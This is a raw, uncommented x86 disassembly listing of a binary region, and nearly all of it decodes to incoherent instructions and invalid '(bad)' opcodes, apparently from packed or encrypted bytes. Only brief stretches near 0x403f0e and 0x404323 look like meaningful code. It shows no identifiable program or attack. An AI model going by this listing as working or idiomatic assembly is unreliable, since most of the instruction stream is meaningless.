  403c5c:	cmp    eax,0x4fed1bfa
  403c61:	(bad)  
  403c62:	jne    0x403be8
  403c64:	cmp    eax,0x7fa1a5b4
  403c69:	cmp    al,0x8a
  403c6b:	mov    al,ds:0xab8e57f1
  403c70:	or     dh,dh
  403c72:	xchg   eax,edi
  403c74:	jbe    0x403ce0
  403c76:	mov    ds:0x92b72d27,al
  403c7b:	mov    ds:0xada5b9b9,eax
  403c80:	cmp    edx,ebp
  403c82:	mov    edi,0x196e2168
  403c87:	cmp    BYTE PTR [edx+0x5d3e46a5],dh
  403c8d:	outs   dx,DWORD PTR ds:[esi]
  403c8e:	popa   
  403c8f:	mov    edi,DWORD PTR [ebx-0x2d]
  403c92:	mov    edx,0x697dcbfe
  403c97:	lock and DWORD PTR [ebp-0xa4e0c54],esi
  403c9e:	cld    
  403c9f:	dec    edi
  403ca0:	mov    WORD PTR [ecx+eax*2],?
  403ca3:	mov    cl,0xf
  403ca5:	addr16 jb 0x403c67
  403ca8:	imul   ebx,DWORD PTR ds:0xee2afe0f,0xffffff8b
  403caf:	repz loop 0x403cfb
  403cb2:	ja     0x403ce6
  403cb4:	xchg   DWORD PTR [ebp+ebx*4+0x58],ebp
  403cb8:	pushf  
  403cb9:	or     ebx,DWORD PTR [edx]
  403cbb:	adc    DWORD PTR [esi],ebp
  403cbd:	xchg   ecx,eax
  403cbe:	pushf  
  403cbf:	fidiv  DWORD PTR [ebx-0x7e]
  403cc2:	mov    WORD PTR [esi],ss
  403cc4:	out    dx,al
  403cc5:	(bad)  
  403cc6:	call   0x2043:0x46e49a19
  403ccd:	mov    al,0xd9
  403ccf:	lahf   
  403cd0:	pop    es
  403cd1:	push   eax
  403cd2:	xlat   BYTE PTR ds:[ebx]
  403cd3:	loop   0x403cd5
  403cd5:	jno    0x403c7f
  403cd7:	pop    esp
  403cd8:	sbb    cl,BYTE PTR [ecx+0x73cd7f7c]
  403cde:	mov    dh,0x4b
  403ce0:	add    DWORD PTR [edx],eax
  403ce2:	mov    ah,bl
  403ce4:	dec    edx
  403ce5:	pop    ebp
  403ce6:	pop    edi
  403ce7:	inc    ecx
  403ce8:	hlt    
  403ce9:	mov    esp,0x9041fb6e
  403cee:	call   0xa0ae7e3c
  403cf3:	inc    ecx
  403cf4:	jb     0x403d00
  403cf6:	sbb    DWORD PTR ds:0x185180dd,eax
  403cfc:	ret    
  403cfd:	fnstcw WORD PTR [ecx-0x18]
  403d00:	adc    BYTE PTR [ecx+0x58],0xa3
  403d04:	mov    al,ds:0xfce4839c
  403d09:	and    eax,0xb8e77eb7
  403d0e:	adc    eax,esi
  403d10:	mov    DWORD PTR [esi],esp
  403d12:	in     eax,dx
  403d13:	outs   dx,DWORD PTR ds:[esi]
  403d14:	loop   0x403ca5
  403d16:	out    0xb,al
  403d18:	mov    cl,0xd
  403d1a:	lds    edi,FWORD PTR [edx+edi*2]
  403d1d:	in     al,0xb
  403d1f:	(bad)  
  403d20:	push   0xd57e67ee
  403d25:	rcr    DWORD PTR [ecx-0x2a8202c7],cl
  403d2b:	jns    0x403ce9
  403d2d:	xor    cl,ch
  403d2f:	pop    ebx
  403d30:	imul   DWORD PTR [edx-0x7]
  403d33:	inc    edi
  403d34:	mov    ecx,0x81019717
  403d39:	pop    ebp
  403d3a:	push   ecx
  403d3b:	scas   eax,DWORD PTR es:[edi]
  403d3c:	loope  0x403cee
  403d3e:	pushf  
  403d3f:	scas   al,BYTE PTR es:[edi]
  403d40:	(bad)  
  403d41:	lock mov al,ds:0xb6a8e052
  403d47:	dec    esi
  403d49:	ss mov ecx,0x9163ea9c
  403d4f:	cs fmul st,st(5)
  403d52:	mul    BYTE PTR [ebp-0x76]
  403d55:	in     al,0x24
  403d57:	adc    esi,DWORD PTR [edi]
  403d59:	cmc    
  403d5a:	fst    st(4)
  403d5c:	push   0x41be8567
  403d61:	pop    edi
  403d62:	scas   eax,DWORD PTR es:[edi]
  403d63:	cmp    BYTE PTR [ecx+0xb],ch
  403d66:	mov    ch,0x72
  403d68:	or     esi,DWORD PTR [edi+0x17fff9cf]
  403d6e:	cmp    dh,bh
  403d70:	sub    esp,edi
  403d72:	aaa    
  403d73:	and    DWORD PTR [esi-0x4e],0x7775c820
  403d7a:	data16 test al,bl
  403d7d:	push   cs
  403d7e:	dec    ebp
  403d7f:	(bad)  
  403d80:	shl    BYTE PTR [edx+ebp*1-0x53],1
  403d84:	pop    ds
  403d85:	aas    
  403d86:	cli    
  403d87:	pop    ds
  403d88:	sbb    esp,0x48
  403d8b:	retf   
  403d8c:	repz jbe 0x403d25
  403d8f:	std    
  403d90:	bound  edi,QWORD PTR [ebx-0x5e01f705]
  403d96:	jp     0x403d6e
  403d98:	mov    WORD PTR [eax],cs
  403d9a:	dec    edi
  403d9b:	xchg   ebx,eax
  403d9c:	pop    esp
  403d9d:	aaa    
  403d9e:	mov    eax,ds:0x3c27f645
  403da3:	mov    ch,0xd5
  403da5:	push   ebx
  403da6:	and    BYTE PTR [edi+0x7c],bl
  403da9:	inc    ebx
  403daa:	fld    QWORD PTR [ebp-0x2657180c]
  403db0:	sub    bl,BYTE PTR [ecx+0x38f2802e]
  403db6:	out    dx,al
  403db7:	xor    cl,BYTE PTR [edx+0x32b3435b]
  403dbd:	xchg   WORD PTR [ecx+0x5d],ax
  403dc1:	jae    0x403dd4
  403dc3:	dec    edi
  403dc4:	xor    edx,eax
  403dc6:	inc    ebp
  403dc7:	cmp    BYTE PTR [esi+0x307e3b33],al
  403dcd:	or     BYTE PTR [edi-0x1abf0709],al
  403dd3:	sub    eax,0xd9960777
  403dd8:	lahf   
  403dd9:	pusha  
  403dda:	mov    esp,0xbb8c502d
  403ddf:	push   edx
  403de0:	mov    dl,0xbb
  403de2:	push   esi
  403de3:	or     eax,0xceb7666e
  403de8:	jbe    0x403e4c
  403dea:	mov    edi,0xa0eae31
  403def:	mov    ds:0xd0a861b4,al
  403df4:	sub    DWORD PTR [edx-0x7c],0xb3bf589b
  403dfb:	ss popf 
  403dfd:	jp     0x403dda
  403dff:	jmp    0x8a63d861
  403e04:	scas   al,BYTE PTR es:[edi]
  403e05:	dec    edx
  403e06:	or     ah,BYTE PTR [esi-0x132e2d55]
  403e0c:	cdq    
  403e0d:	cmp    DWORD PTR [ebx],0xc84477b0
  403e13:	dec    esp
  403e14:	push   0xffffffce
  403e16:	ja     0x403dcb
  403e18:	test   DWORD PTR [esi],esi
  403e1a:	jp     0x403e65
  403e1c:	data16 loop 0x403de7
  403e1f:	pop    esp
  403e20:	push   edx
  403e21:	xchg   edx,eax
  403e22:	and    al,0x95
  403e24:	inc    ecx
  403e25:	inc    esp
  403e26:	les    edi,FWORD PTR [ebp*1-0x401e95ed]
  403e2d:	idiv   DWORD PTR [edx]
  403e2f:	jns    0x403e48
  403e31:	in     eax,dx
  403e32:	xchg   edx,eax
  403e33:	mov    BYTE PTR [ecx],dl
  403e35:	clc    
  403e36:	mov    WORD PTR [eax],fs
  403e38:	mov    ebx,0x934dc146
  403e3d:	dec    esi
  403e3e:	arpl   WORD PTR [ebx+eiz*8-0x4c9d50e9],bx
  403e45:	hlt    
  403e46:	cs stos DWORD PTR es:[edi],eax
  403e48:	(bad)
  403e4c:	inc    ebx
  403e4d:	mov    edi,0x38fdf324
  403e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e53:	fcmovnb st,st(6)
  403e55:	and    BYTE PTR [ecx+0x70acc8da],ch
  403e5b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5d:	add    ebx,ebx
  403e5f:	fld    DWORD PTR [edx-0x33b2e30b]
  403e65:	and    al,0x1e
  403e67:	xor    ecx,DWORD PTR [eax-0x6c]
  403e6a:	lods   eax,DWORD PTR ds:[esi]
  403e6b:	jbe    0x403e98
  403e6d:	xor    eax,eax
  403e6f:	mov    dl,0x1b
  403e71:	cmp    BYTE PTR [ecx+eiz*8],0x7c
  403e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e76:	stos   DWORD PTR es:[edi],eax
  403e77:	ficom  DWORD PTR [ebx]
  403e79:	sub    al,0xab
  403e7b:	xor    DWORD PTR [edx],edx
  403e7d:	aam    0x1d
  403e7f:	in     al,0x85
  403e81:	adc    BYTE PTR [esi+0x38],dl
  403e84:	loop   0x403f05
  403e86:	mov    BYTE PTR [ecx+ebx*2-0x35],dl
  403e8a:	dec    ebx
  403e8b:	push   edx
  403e8c:	push   ecx
  403e8d:	mov    BYTE PTR [esi+0x65],ah
  403e90:	adc    BYTE PTR [ecx],dl
  403e92:	jnp    0x403e29
  403e94:	jmp    0xea34c5be
  403e99:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e9b:	mov    ecx,0x2feb162f
  403ea0:	dec    eax
  403ea1:	and    eax,0x623fe32b
  403ea6:	bound  edi,QWORD PTR [eax-0x65]
  403ea9:	hlt    
  403eaa:	aad    0x3c
  403eac:	cwde   
  403ead:	mov    eax,0x93a4f400
  403eb2:	cdq    
  403eb3:	call   0x2788:0xf94652c0
  403eba:	fld    QWORD PTR [ebx]
  403ebc:	or     BYTE PTR [eax],0x5a
  403ebf:	bound  ebp,QWORD PTR [ebx]
  403ec1:	push   ebx
  403ec2:	clc    
  403ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec4:	sub    DWORD PTR [edi+0x3398774b],eax
  403eca:	pop    ss
  403ecb:	mov    dl,0xf1
  403ecd:	pop    es
  403ece:	test   DWORD PTR [ebx+0x2f],esi
  403ed1:	inc    ebp
  403ed2:	jne    0x403e8f
  403ed4:	(bad)
  403ed7:	retf   0x3dc9
  403eda:	xchg   BYTE PTR [edi+0x151a7d28],ah
  403ee0:	jnp    0x403eec
  403ee2:	int3   
  403ee3:	arpl   WORD PTR [esi-0x46daac6c],ax
  403ee9:	int    0x77
  403eeb:	jp     0x403f25
  403eed:	popa   
  403eee:	aam    0xdc
  403ef0:	jmp    0x613a:0x4301eea2
  403ef7:	scas   al,BYTE PTR es:[edi]
  403ef8:	loop   0x403f54
  403efa:	iret   
  403efb:	test   dl,0x7b
  403efe:	or     eax,0xcd1d11ef
  403f03:	push   edi
  403f04:	rcl    BYTE PTR [ecx-0x4d],0x1e
  403f08:	mov    dl,0x8
  403f0a:	jecxz  0x403f0f
  403f0c:	add    DWORD PTR [ecx],ebx
  403f0e:	sbb    eax,0x42818f
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x42820f
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42839b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428257,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x7570c0bc],ch
  403f58:	jl     0x403f28
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    bh,bl
  403f62:	cmp    BYTE PTR [edi-0x22],0x42
  403f66:	cmp    cl,BYTE PTR [esi]
  403f68:	pop    ebp
  403f69:	call   eax
  403f6b:	and    al,0x89
  403f6d:	repz mov cl,0xfd
  403f70:	add    ch,BYTE PTR [esi+0x77]
  403f73:	or     al,0xff
  403f75:	enter  0x9a7e,0x44
  403f79:	out    dx,al
  403f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f7b:	inc    ebx
  403f7c:	popa   
  403f7d:	scas   eax,DWORD PTR es:[edi]
  403f7e:	mov    esp,0xe9c341ba
  403f83:	mov    DWORD PTR [ecx+0x5a],edx
  403f86:	lahf   
  403f87:	push   edi
  403f88:	sub    eax,0xddc7dde7
  403f8d:	test   DWORD PTR [ebx-0x7e03509f],edx
  403f93:	pushf  
  403f94:	ss sbb eax,0xc1568303
  403f9a:	stos   BYTE PTR es:[edi],al
  403f9b:	aam    0x98
  403f9d:	fsubr  QWORD PTR [ebp-0x78d7996b]
  403fa3:	in     al,0xea
  403fa5:	jo     0x404021
  403fa7:	xchg   edx,eax
  403fa8:	xor    bh,BYTE PTR [esi+0x77b97940]
  403fae:	fisttp WORD PTR [edi]
  403fb0:	add    eax,0x6db0daf0
  403fb5:	add    eax,0xfed5f7fe
  403fba:	ins    DWORD PTR es:[edi],dx
  403fbb:	add    BYTE PTR [edi+0x15],cl
  403fbe:	or     DWORD PTR [esi-0x2d],ebx
  403fc1:	sar    BYTE PTR [eax+0x2f],1
  403fc4:	jmp    0x403f6f
  403fc6:	aaa    
  403fc7:	mov    ch,0xe7
  403fc9:	jg     0x40400e
  403fcb:	and    DWORD PTR [ecx],ecx
  403fcd:	xchg   esi,esp
  403fcf:	add    BYTE PTR [edx],bl
  403fd1:	or     al,0x51
  403fd3:	fcompp 
  403fd5:	test   DWORD PTR [ebp+ebx*4+0x28d59a15],esp
  403fdc:	push   esi
  403fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fde:	xchg   edx,eax
  403fdf:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403fe1:	retf   
  403fe2:	and    ch,BYTE PTR [ecx-0x7934108c]
  403fe8:	push   ebp
  403fe9:	mov    ds:0x50e71c0,al
  403fee:	inc    edi
  403fef:	mov    esi,0x556f82b
  403ff4:	push   0x53
  403ff6:	xlat   BYTE PTR ds:[ebx]
  403ff7:	fs ss sbb eax,0x94a28108
  403ffe:	fadd   DWORD PTR [edi]
  404000:	add    DWORD PTR [ebp+0x1aad02e9],ecx
  404006:	(bad)  
  404007:	and    dh,ch
  404009:	sub    eax,0x6b753401
  40400e:	sbb    al,0x6d
  404010:	sbb    al,0x6a
  404012:	mov    edx,0xdeebd29d
  404017:	jae    0x403ffd
  404019:	mov    bh,0x12
  40401b:	mov    dl,0xaf
  40401d:	ss adc al,0xd
  404020:	mov    edx,0xa8da9b59
  404025:	sbb    bh,BYTE PTR [edi+ebp*8+0x37]
  404029:	js     0x40403d
  40402b:	mov    bh,0x54
  40402d:	mov    ch,0x5e
  40402f:	mov    es,WORD PTR [ebx+0x15281c23]
  404035:	sbb    eax,0x3a759b37
  40403a:	push   ecx
  40403b:	pop    ecx
  40403c:	(bad)  
  40403d:	stos   DWORD PTR es:[edi],eax
  40403e:	push   esp
  40403f:	pop    esp
  404040:	out    dx,eax
  404041:	sbb    bh,BYTE PTR [ecx-0x66b8ac4a]
  404047:	add    eax,DWORD PTR [esi]
  404049:	(bad)  
  40404a:	ja     0x4040ad
  40404c:	lds    esp,FWORD PTR [esi]
  40404e:	test   DWORD PTR [ebx-0x7d],ebx
  404051:	add    ecx,DWORD PTR [edx]
  404053:	sbb    ch,BYTE PTR [esi+ecx*2+0x521fed76]
  40405a:	hlt    
  40405b:	(bad)  
  40405c:	jg     0x40400d
  40405e:	pop    es
  40405f:	fsubp  st(5),st
  404061:	retf   
  404062:	outs   dx,DWORD PTR ds:[esi]
  404063:	lods   al,BYTE PTR ds:[esi]
  404064:	in     al,dx
  404065:	inc    ecx
  404066:	mov    DWORD PTR [ebp+0x5c],edi
  404069:	mov    ch,0xee
  40406b:	call   0xe9e3:0x2e328ab7
  404072:	cmp    dh,bh
  404074:	fidiv  WORD PTR [esi]
  404076:	dec    ecx
  404077:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404078:	mov    eax,ds:0x86742f3c
  40407d:	pop    ss
  40407e:	or     cl,BYTE PTR [eax+edi*2-0x7a9e9478]
  404085:	cdq    
  404086:	in     eax,0x6c
  404088:	mov    ecx,0x9ac2fbaf
  40408d:	popf   
  40408e:	pop    ecx
  40408f:	sbb    ecx,0x33a15310
  404095:	push   esi
  404096:	cmp    eax,0xaf36c2cf
  40409b:	mov    ebp,0xa25e78dd
  4040a0:	aad    0xa0
  4040a2:	add    eax,0x760e80a5
  4040a7:	dec    ecx
  4040a8:	ins    DWORD PTR es:[edi],dx
  4040a9:	jns    0x404048
  4040ab:	sar    DWORD PTR [ebx+0x4b],1
  4040ae:	jg     0x4040a0
  4040b0:	in     al,0x6a
  4040b2:	retf   0xaf68
  4040b5:	xchg   ebx,eax
  4040b6:	dec    ebx
  4040b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040b8:	and    ecx,ebp
  4040ba:	jmp    0x404118
  4040bc:	fst    QWORD PTR [esi-0x6f95f0b3]
  4040c2:	mov    ebp,0x5113dde9
  4040c7:	fmul   QWORD PTR [ecx-0x3cbe6229]
  4040cd:	inc    eax
  4040ce:	jno    0x4040c3
  4040d0:	test   BYTE PTR [edi+0x48],bl
  4040d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d4:	ds scas eax,DWORD PTR es:[edi]
  4040d6:	or     al,0x4
  4040d8:	xchg   edx,eax
  4040d9:	mov    esp,0xcf71350a
  4040de:	xchg   ecx,eax
  4040df:	mov    fs,WORD PTR [ebx]
  4040e1:	xor    BYTE PTR [esi-0x7664f915],ah
  4040e7:	imul   edx,DWORD PTR [esi-0x187d0f97],0xd165821a
  4040f1:	in     al,dx
  4040f2:	xchg   edi,eax
  4040f3:	push   edx
  4040f4:	cli    
  4040f5:	repnz mov ebx,0xc7ae0d77
  4040fb:	mov    edi,0x8745abab
  404100:	(bad)  
  404101:	sbb    ebp,DWORD PTR ds:0x500f0ee7
  404107:	adc    ah,BYTE PTR [ecx]
  404109:	mov    esp,0xeeee425d
  40410e:	imul   ecx,ecx,0xa9e31307
  404114:	push   esp
  404115:	hlt    
  404116:	sbb    DWORD PTR [eax+0x25e3044b],0xffffff8e
  40411d:	sbb    eax,0x1f3f4fa1
  404122:	push   edx
  404123:	mov    eax,0x82981800
  404128:	aad    0xa
  40412a:	paddq  mm0,QWORD PTR [ecx]
  40412d:	xchg   edi,eax
  40412e:	test   ebp,0x85ba41ba
  404134:	push   0xffffffdf
  404136:	xor    ax,0x3cd1
  40413a:	cmp    DWORD PTR [edx-0x1e],0x469c2152
  404141:	loopne 0x404125
  404143:	cs pop ds
  404145:	mov    ebp,edx
  404147:	mov    bl,0x92
  404149:	jp     0x40412c
  40414b:	retf   0x7157
  40414e:	mov    al,0x78
  404150:	out    dx,eax
  404151:	popa   
  404152:	xor    BYTE PTR [eax-0x4a],bl
  404155:	mov    al,ds:0x869b70fe
  40415a:	push   ds
  40415b:	add    eax,0x683992cb
  404160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404161:	ja     0x40410c
  404163:	cdq    
  404164:	mov    al,0xd4
  404166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404167:	nop
  404168:	xor    BYTE PTR [esi+ebp*8-0x55bd4b51],ah
  40416f:	jl     0x4041c0
  404171:	loop   0x404154
  404173:	pushf  
  404174:	(bad)  
  404175:	out    dx,eax
  404176:	enter  0xdddd,0xf2
  40417a:	mov    ebx,0x1b0b21e6
  40417f:	jae    0x4041ac
  404181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404182:	cmp    BYTE PTR [edi-0x69],0x4c
  404186:	hlt    
  404187:	jp     0x404150
  404189:	jne    0x4041f7
  40418b:	fadd   DWORD PTR [ebx+0xb]
  40418e:	mov    al,0x32
  404190:	mov    esp,0x8eeedc79
  404195:	mov    al,0x13
  404197:	outs   dx,BYTE PTR ds:[esi]
  404198:	jle    0x40411d
  40419a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40419b:	cdq    
  40419c:	jmp    0x4041c0
  40419e:	push   eax
  40419f:	int    0x2
  4041a1:	loop   0x4041e4
  4041a3:	xor    eax,ebp
  4041a5:	jo     0x404137
  4041a7:	xor    bh,BYTE PTR [ecx+0x42]
  4041aa:	push   esi
  4041ab:	pop    ds
  4041ac:	add    eax,DWORD PTR [edi]
  4041ae:	(bad)  
  4041af:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b1:	mov    bl,0x77
  4041b3:	xor    dh,BYTE PTR [ecx]
  4041b5:	popf   
  4041b6:	push   ebp
  4041b7:	lods   eax,DWORD PTR ds:[esi]
  4041b8:	push   0x62bbbc84
  4041bd:	sbb    edx,DWORD PTR [eax+eiz*2]
  4041c0:	cdq    
  4041c1:	xor    bh,ah
  4041c3:	sub    BYTE PTR [ebx],cl
  4041c5:	int3   
  4041c6:	mov    ch,0x25
  4041c8:	idiv   BYTE PTR [ecx+0xd]
  4041cb:	adc    DWORD PTR [ecx],edi
  4041cd:	mov    ecx,0xc3c4aac8
  4041d2:	mov    dl,0xd1
  4041d4:	inc    ecx
  4041d5:	loop   0x4041ce
  4041d7:	sub    eax,0xdde7a8d0
  4041dc:	and    eax,0xd740360d
  4041e1:	add    eax,DWORD PTR ds:0xe68d2d2e
  4041e7:	fld    QWORD PTR [eax+esi*4+0x79]
  4041eb:	jl     0x4041f8
  4041ed:	xchg   DWORD PTR [ecx-0x35],ebx
  4041f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f1:	push   es
  4041f2:	imul   esi,DWORD PTR [ebp+0x4b],0xc70716e8
  4041f9:	inc    esi
  4041fa:	mov    edx,0xe9c47602
  4041ff:	pop    edx
  404200:	push   esi
  404201:	push   eax
  404202:	aas    
  404203:	cli    
  404204:	sbb    eax,0x2bc25c97
  404209:	pop    ebp
  40420a:	inc    ebx
  40420b:	daa    
  40420c:	fs clc 
  40420e:	add    eax,0x74ef47d4
  404213:	(bad)  
  404214:	into   
  404215:	xor    dl,BYTE PTR [edi-0x4385389]
  40421b:	xor    BYTE PTR [ebx],dl
  40421d:	pop    ds
  40421e:	dec    ebp
  40421f:	outs   dx,BYTE PTR ds:[esi]
  404220:	sahf   
  404221:	dec    eax
  404222:	outs   dx,DWORD PTR ds:[esi]
  404223:	xor    BYTE PTR [ebx],bl
  404225:	repnz nop
  404227:	mov    ebp,0xf0aa3519
  40422c:	repz test BYTE PTR [esi-0x7b7f80e3],cl
  404233:	adc    eax,0x29f24abd
  404238:	leave  
  404239:	and    cl,BYTE PTR [edi-0x33]
  40423c:	stos   BYTE PTR es:[edi],al
  40423d:	sar    DWORD PTR [edi+0x2a],0xa5
  404241:	adc    eax,0x97b99c65
  404246:	repz push cs
  404248:	in     al,0xe1
  40424a:	sub    bh,BYTE PTR [esi-0x7f]
  40424d:	sub    DWORD PTR ds:0x1082ad51,ebx
  404253:	sbb    DWORD PTR [ecx-0x3],esp
  404256:	cdq    
  404257:	enter  0xfa70,0x7e
  40425b:	ficom  WORD PTR [ecx]
  40425d:	icebp  
  40425e:	inc    ecx
  40425f:	lods   eax,DWORD PTR ds:[esi]
  404260:	and    eax,0x42217d56
  404265:	adc    ebp,DWORD PTR [edi-0x3d0738b7]
  40426b:	mov    esi,0x4ca6825b
  404270:	pop    ss
  404271:	push   edx
  404272:	mov    esp,0xabebbd4a
  404277:	add    edx,ebp
  404279:	dec    ebx
  40427a:	add    BYTE PTR [ecx+0x11],bl
  40427d:	jns    0x404278
  40427f:	js     0x4042e4
  404281:	mov    ds:0xf46edf49,eax
  404286:	dec    eax
  404287:	mov    WORD PTR fs:[eax],ds
  40428a:	in     eax,0x9
  40428c:	fstp   TBYTE PTR [esi-0x70cc624d]
  404292:	or     edi,esp
  404294:	out    dx,al
  404295:	or     DWORD PTR [edx-0x18a6baf9],esp
  40429b:	mov    ebp,edi
  40429d:	jg     0x4042c0
  40429f:	xor    al,ch
  4042a1:	xlat   BYTE PTR ds:[ebx]
  4042a2:	jns    0x404281
  4042a4:	jg     0x404273
  4042a6:	icebp  
  4042a7:	fidivr WORD PTR gs:[esi]
  4042aa:	ins    DWORD PTR es:[edi],dx
  4042ab:	mov    esp,0xe2c5e8d9
  4042b0:	pop    ss
  4042b1:	mov    ecx,0x44f80504
  4042b6:	inc    esp
  4042b7:	and    al,0xae
  4042b9:	cmp    dl,BYTE PTR [esi+0x5fcdebf8]
  4042bf:	inc    edx
  4042c0:	push   ebp
  4042c1:	inc    ecx
  4042c2:	jge    0x4042c0
  4042c4:	retf   0x5932
  4042c7:	pushf  
  4042c8:	test   BYTE PTR [ebx],cl
  4042ca:	iret   
  4042cb:	scas   eax,DWORD PTR es:[edi]
  4042cc:	aad    0xb6
  4042ce:	push   eax
  4042cf:	mov    ebx,0xb0956712
  4042d4:	lahf   
  4042d5:	xchg   ebx,eax
  4042d6:	xchg   ebp,esi
  4042d8:	pop    esp
  4042d9:	mov    dl,0x27
  4042db:	(bad)  
  4042dd:	das    
  4042de:	mov    DWORD PTR [esi+eax*4],eax
  4042e1:	jo     0x40433a
  4042e3:	pop    esi
  4042e4:	ins    DWORD PTR es:[edi],dx
  4042e5:	inc    ecx
  4042e6:	retf   0xe0a8
  4042e9:	dec    eax
  4042ea:	jbe    0x404279
  4042ec:	mov    dh,0xd6
  4042ee:	jbe    0x4042d0
  4042f0:	sub    eax,0x11661136
  4042f5:	xchg   ecx,eax
  4042f6:	sbb    eax,0x2c2e905f
  4042fb:	jmp    0x404306
  4042fd:	cmp    BYTE PTR [ebx],dl
  4042ff:	push   esp
  404300:	xlat   BYTE PTR ds:[ebx]
  404301:	jb     0x404377
  404303:	jo     0x4042e0
  404305:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404307:	cmp    ah,BYTE PTR [ebx]
  404309:	je     0x4042eb
  40430b:	ret    
  40430c:	out    dx,al
  40430d:	mov    ch,cl
  40430f:	mov    dh,BYTE PTR [edi]
  404311:	aad    0x3b
  404313:	mov    eax,0x107fc4a1
  404318:	xchg   esp,ebp
  40431a:	jne    0x4042ab
  40431c:	lock repnz sub eax,0x8b83ea9e
  404323:	push   ebx
  404324:	add    al,0x21
  404326:	sbb    eax,0x42825b
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42828b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x428307
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428247
  404344:	and    DWORD PTR ds:0x4283a7,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42838f
  404355:	sbb    DWORD PTR ds:0x42829b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	cmp    eax,0x55aa1601
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    al,dh
  40437c:	mov    edx,0xcbfb2918
  404381:	shl    DWORD PTR [esi+0x17],cl
  404384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404385:	jbe    0x404374
  404387:	stc    
  404388:	dec    esi
  404389:	mov    al,0x8c
  40438b:	push   es
  40438c:	dec    esp
  40438d:	je     0x40432d
  40438f:	mov    bh,BYTE PTR [ebp-0x6be29781]
  404395:	push   0x7010949d
  40439a:	add    eax,0x469c8da9
  40439f:	sub    esp,DWORD PTR [esp+eiz*8-0x41e27d19]
  4043a6:	inc    esp
  4043a7:	mov    dh,0xa2
  4043a9:	jae    0x4043c0
  4043ab:	je     0x4043ae
  4043ad:	jbe    0x4043f0
  4043af:	mov    dh,0xaf
  4043b1:	mov    eax,ds:0x9de26b90
  4043b6:	daa    
  4043b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b8:	sbb    DWORD PTR [ebx],ecx
  4043ba:	or     eax,0x3e1c0740
  4043bf:	push   esp
  4043c0:	jecxz  0x40438b
  4043c2:	inc    ebp
  4043c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c4:	mov    eax,0x6ccd50e5
  4043c9:	aas    
  4043ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043cb:	mov    ebx,0x5739a391
  4043d0:	call   0xe3cbda06
  4043d5:	adc    edi,DWORD PTR [ebx+0x48d17d0f]
  4043db:	dec    ebp
  4043dc:	dec    ebx
  4043dd:	aad    0xe1
  4043df:	outs   dx,DWORD PTR ds:[esi]
  4043e0:	les    esi,FWORD PTR [esi]
  4043e2:	pusha  
  4043e3:	add    ebx,DWORD PTR [eax]
  4043e5:	xchg   edx,eax
  4043e6:	adc    DWORD PTR [eax+0x16],ecx
  4043e9:	cdq    
  4043ea:	(bad)  
  4043eb:	mov    ch,0x5d
  4043ed:	sub    BYTE PTR [ebx*4-0x627d8639],dh
  4043f4:	sbb    eax,0x1454adf
  4043f9:	cmp    DWORD PTR [edx-0x34745891],eax
  4043ff:	mov    ?,WORD PTR ss:[eax+0xac738c8]
  404406:	movhps xmm2,QWORD PTR [esi+0x23c12198]
  40440d:	push   cs
  40440e:	sub    DWORD PTR [ebx],esi
  404410:	repnz pop edx
  404412:	(bad)  
  404413:	out    0x64,al
  404415:	adc    al,0x1b
  404417:	mov    DWORD PTR [ecx],edx
  404419:	push   edx
  40441a:	loope  0x404442
  40441c:	stos   BYTE PTR es:[edi],al
  40441d:	stc    
  40441e:	add    al,0x9c
  404420:	std    
  404421:	clc    
  404422:	cwde   
  404423:	or     dh,bh
  404425:	out    dx,eax
  404426:	sub    BYTE PTR [edi],ah
  404428:	cli    
